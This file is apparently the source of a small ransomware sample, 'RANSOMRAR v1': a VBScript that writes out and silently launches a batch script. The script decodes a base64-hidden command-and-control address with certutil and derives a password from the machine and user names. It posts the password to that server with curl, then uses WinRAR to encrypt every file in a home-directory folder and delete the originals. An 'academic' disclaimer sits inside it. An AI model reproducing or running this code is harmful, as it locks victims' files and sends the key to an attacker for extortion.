set filesys = CreateObject ("Scripting.FileSystemObject")
If (filesys.FileExists("TMP.bat")) Then
  Set delfile = filesys.GetFile("TMP.bat")
  delfile.Delete
Else
Set FSO = CreateObject("Scripting.FileSystemObject")
Set lf = FSO.OpenTextFile("TMP.bat", 8, True)
lf.WriteLine ("@echo off")
lf.WriteLine ("color c0")
lf.WriteLine ("title RANSOMRAR v1")
lf.WriteLine ("REM # This project is purely academic, use at your own risk. I do not encourage in any way the use of this software illegally or to attack targets without their previous authorization.")

lf.WriteLine ("GOTO INI")

lf.WriteLine (":INI")
lf.WriteLine ("REM # SET PARAMETERS")
lf.WriteLine ("echo # SET PARAMETERS")
lf.WriteLine ("set b64=Imh0dHA6Ly8xMjcuMC4wLjE6Nzc3Ny8i")
lf.WriteLine ("set path=C:\Program Files\WinRAR\;%path%")
lf.WriteLine ("set target=%HOMEPATH%\ransomrar")
lf.WriteLine ("mkdir %target%")

lf.WriteLine ("REM # SET C2")
lf.WriteLine ("echo # SET C2")
lf.WriteLine ("echo %b64%>b64")
lf.WriteLine ("certutil -decode b64 c2")
lf.WriteLine ("FOR /F %%c IN (c2) do set c2=%%c")
lf.WriteLine ("del /F b64")
lf.WriteLine ("del /F c2")

lf.WriteLine ("REM # GENERATE KEY")
lf.WriteLine ("echo # GENERATE KEY")
lf.WriteLine ("set id=%RANDOM%%RANDOM%%RANDOM%")
lf.WriteLine ("set pass=%RANDOM%%COMPUTERNAME%%RANDOM%%USERNAME%")
lf.WriteLine ("echo %pass%>temp")
lf.WriteLine ("certutil -hashfile temp SHA256 | findstr /i /v sha256 | findstr /i /v certutil>s256")
lf.WriteLine ("FOR /F %%p IN (s256) do set key=%%p")
lf.WriteLine ("echo %key%>key_%id%.txt")
lf.WriteLine ("echo %id%>ID_%id%.txt")

lf.WriteLine ("REM # SEND KEY")
lf.WriteLine (":SENDKEY")
lf.WriteLine ("echo # SEND KEY")
lf.WriteLine ("timeout 5")
lf.WriteLine ("curl -X POST -F id=%id% -F key=%key% %c2%")
lf.WriteLine ("echo %ERRORLEVEL%")
lf.WriteLine ("set error=%ERRORLEVEL%")
lf.WriteLine ("echo %error%")
lf.WriteLine ("REM # Error level 7: Connection refused")
lf.WriteLine ("REM # Error level 28: Timed out")
lf.WriteLine ("REM # Error level 52: Empty reply from server")
lf.WriteLine ("IF %error% NEQ 52 GOTO SENDKEY")

lf.WriteLine ("REM # DELETE TEMPORARY FILES")
lf.WriteLine ("echo # DELETE TEMPORARY FILES")
lf.WriteLine ("del /F temp")
lf.WriteLine ("del /F s256")

lf.WriteLine ("REM # START ENCRYPTION")
lf.WriteLine ("echo # START ENCRYPTION")
lf.WriteLine ("cd %target%")
lf.WriteLine ("echo TARGET:")
lf.WriteLine ("echo %target%")

lf.WriteLine ("FOR /R %%d IN (*.*) do rar a -ep -df -x*.dll -p%key% ""%%d.rar"" ""%%d""")

lf.WriteLine ("REM # END")
lf.WriteLine (":END")
lf.WriteLine ("echo # END")

lf.WriteLine ("timeout 30")
lf.WriteLine ("exit")

lf.Close
Set lf = Nothing
Set FSO = Nothing

Set WshShell = CreateObject("WScript.Shell")
WshShell.Run Chr(34) & "TMP.bat" & Chr(34), 0
Set WshShell = Nothing

End If
